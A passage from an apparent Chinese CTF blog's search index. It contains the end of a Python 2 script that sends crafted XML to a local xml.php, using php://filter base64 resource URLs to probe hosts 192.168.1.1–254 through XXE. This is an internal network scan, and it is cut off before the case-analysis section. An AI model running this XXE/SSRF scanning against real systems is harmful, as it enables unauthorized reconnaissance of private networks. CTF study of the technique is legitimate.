&#39;application/xml&#39;}    x = requests.post(&#39;http://127.0.0.1/xml.php&#39;, data=xml, headers=headers, timeout=5).text    coded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value    print coded_string#   print base64.b64decode(coded_string)for i in range(1, 255):    try:        i = str(i)        ip = &#39;192.168.1.&#39; + i        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;        print string        build_xml(string)    except:      print &quot;error&quot;continue</code></pre><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
